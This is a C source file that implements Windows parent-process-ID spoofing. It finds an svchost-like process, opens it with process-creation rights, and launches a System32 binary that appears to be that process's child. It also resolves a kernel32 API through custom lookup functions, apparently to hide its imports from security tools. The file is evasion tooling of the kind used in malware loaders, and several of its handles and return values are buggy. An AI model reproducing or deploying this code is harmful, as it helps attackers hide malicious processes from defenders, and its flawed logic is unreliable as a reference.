#include "common.h"

BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID)
{
	// Get process snapshot
	HANDLE hProcSnapshot = NULL;
	PROCESSENTRY32 pProcess = { .dwSize = sizeof(PROCESSENTRY32) };
	hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	Process32First(hProcSnapshot, &pProcess);
	// Get parent handle
	HANDLE hTest = NULL;
	do {
		// Lower process name
		for (int i = 0; pProcess.szExeFile[i]; i++) {
			pProcess.szExeFile[i] = tolower(pProcess.szExeFile[i]);
		}
		// Check if svchost
		if (strcmp(pProcess.szExeFile, sProcessName) == 0 && pProcess.th32ProcessID > 1000) {

			// Try opening a handle with necessary perms for spoofing
			hTest = OpenProcess(PROCESS_CREATE_PROCESS, NULL, pProcess.th32ProcessID);
			if (hTest != NULL)
			{
				*hParent = hTest;
				*dwProcessID = pProcess.th32ProcessID;
				return EXIT_SUCCESS;
			}
		}
	} while (Process32Next(hProcSnapshot, &pProcess));

	return EXIT_FAILURE;
}

BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
{
	// Inits
	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];
	CHAR lpWorkPath[MAX_PATH];
	SIZE_T                             sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;
	STARTUPINFOEXA                     SiEx = { 0 };
	PROCESS_INFORMATION                Pi = { 0 };

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Create spoofed path
	GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	sprintf(lpWorkPath, "%s\\System32\\", WnDr);

	// First call for init
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
	// Allocate memory for thread list
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	// Second call for populating list
	InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList);
	// Update PPID
	UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);

	// Create process with spoofed params
	SiEx.lpAttributeList = pThreadAttList;
	CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		lpWorkPath,
		&SiEx.StartupInfo,
		&Pi
	);
	f_WaitForSingleObject rWaitForSingleObject = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WaitForSingleObject");
	rWaitForSingleObject(hThread, 100);

	// Returns and cleanup
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	return FALSE;
}
